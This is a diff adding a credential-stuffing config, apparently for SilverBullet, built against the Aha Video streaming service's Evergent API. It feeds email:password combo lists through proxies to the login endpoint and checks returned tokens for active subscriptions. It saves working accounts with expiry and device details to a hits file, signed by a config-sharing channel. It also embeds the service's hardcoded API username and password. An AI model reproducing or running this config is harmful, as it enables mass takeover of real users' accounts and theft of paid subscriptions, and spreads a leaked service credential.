@@ -1,0 +1,168 @@
+[SETTINGS]
+{
+  "Name": "Aha Video @ExVotic_Network",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-04T00:21:54.4177838+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ExVotic_Configs",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "AHA",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#USERAGENT FUNCTION GetRandomUA -> VAR "UA" 
+
+#MAIL_VALIDATION REQUEST POST "https://rest-prod-aha.evergent.com/aha/searchAccountV2" 
+  CONTENT "{\"SearchAccountV2RequestMessage\":{\"email\":\"<USER>\",\"channelPartnerID\":\"ARHAMEDIA\",\"apiUser\":\"ahaapiuser\",\"apiPassword\":\"Aha@p!u$#r123#$\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "No accounts found" 
+  KEYCHAIN Success OR 
+    KEY "message\":\"SUCCESS\"" 
+
+#LOGIN_VERIFICATION REQUEST POST "https://rest-prod-aha.evergent.com/aha/getOAuthAccessTokenv2" 
+  CONTENT "{\"GetOAuthAccessTokenv2RequestMessage\":{\"contactUserName\":\"<USER>\",\"contactPassword\":\"<PASS>\",\"deviceMessage\":{\"deviceName\":\"web\",\"deviceType\":\"mobile-web\",\"modelNo\":\"chrome\",\"serialNo\":\"2d75cca3-cee0-42fd-a2bd-24dfdf8b148b\",\"appType\":\"Web\",\"userAgent\":\"vaddangi\"},\"channelPartnerID\":\"ARHAMEDIA\",\"apiUser\":\"ahaapiuser\",\"apiPassword\":\"Aha@p!u$#r123#$\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Wrong Username or Password" 
+    KEY "responseCode\":\"0\"" 
+  KEYCHAIN Success OR 
+    KEY "responseCode\":\"1\"" 
+    KEY "\"accessToken\":" 
+
+#TOKEN PARSE "<SOURCE>" JSON "accessToken" -> VAR "tk" 
+
+#PROFILE REQUEST POST "https://rest-prod-aha.evergent.com/aha/getAccountProfile" 
+  CONTENT "{\"GetAccountProfileRequestMessage\":{\"channelPartnerID\":\"AHA_IN\",\"apiUser\":\"ahaapiuser\",\"apiPassword\":\"Aha@p!u$#r123#$\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authorization: Bearer <tk>" 
+  HEADER "content-length: 120" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+UTILITY File "Combo/Combos.txt" AppendLines "<USER>:<PASS>" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"neverSubscribed\":true" 
+    KEY "\"isUserFreeTrial\":\"Y\"" 
+  KEYCHAIN Custom "EXPIRED" AND 
+    KEY "\"neverSubscribed\":false" 
+    KEY "subscriptionStatus\":false" 
+  KEYCHAIN Success OR 
+    KEY "\"neverSubscribed\":false," 
+    KEY "subscriptionStatus\":true" 
+    KEY "<DAYS REMAINING>" GreaterThan "0" 
+
+#EXPIRY PARSE "<SOURCE>" JSON "subscriptionExpDateTime" -> VAR "expire" 
+
+#EXPIRES_ON FUNCTION UnixTimeToDate "yyyy-MM-dd" "<expire>" -> CAP "EXPIRES ON" 
+
+#DAYS_REMAINING FUNCTION GetRemainingDay "<EXPIRES ON>" -> CAP "DAYS REMAINING" 
+
+#SUBSCRIBED_TO PARSE "<SOURCE>" LR "\"subscribedCatalogue\":[\"" "\"]}}" CreateEmpty=FALSE -> CAP "Subscribed To" 
+
+#REGISTERED_DEVICES PARSE "<SOURCE>" JSON "numDeviceRegistered" CreateEmpty=FALSE -> CAP "No.Of Registered Devices" 
+
+REQUEST POST "https://rest-prod-aha.evergent.com/aha/getEntitlements" 
+  CONTENT "{\"GetEntitlementsRequestMessage\":{\"contactID\":\"229278404\",\"channelPartnerID\":\"AHA_IN\",\"apiUser\":\"ahaapiuser\",\"apiPassword\":\"Aha@p!u$#r123#$\",\"returnUpgradableFlag\":\"true\",\"returnProductAttributes\":\"true\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "authorization: Bearer <tk>" 
+  HEADER "content-length: 205" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://www.aha.video" 
+  HEADER "referer: https://www.aha.video/" 
+  HEADER "sec-ch-ua: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: <UA>" 
+
+#RENEWAL PARSE "<SOURCE>" JSON "isRenewal" CreateEmpty=FALSE -> CAP "RENEWAL" 
+
+#CREDITS FUNCTION Constant "@ExVotic_Configs " -> CAP "CONFIG BY" 
+
+UTILITY File "Hits\\Aha_Hits.txt" Append "\\n[+]----------- Aha Account ----------[+]\\n \\nEmail = <USER>\\nPassword = <PASS>\\n \\n[+] Expiry = <EXPIRES ON>\\n[+] Days Left = <DAYS REMAINING>\\n[+] Subscribed To = <Subscribed To>\\n[+] No.Of Registered Devices = <No.Of Registered Devices>\\n[+] RENEWAL = <RENEWAL>\\n[+] Config By = @ExVotic | Join @ExVotic_Network\\n\\n[+]-----------------------------------[+]\\n " 
+
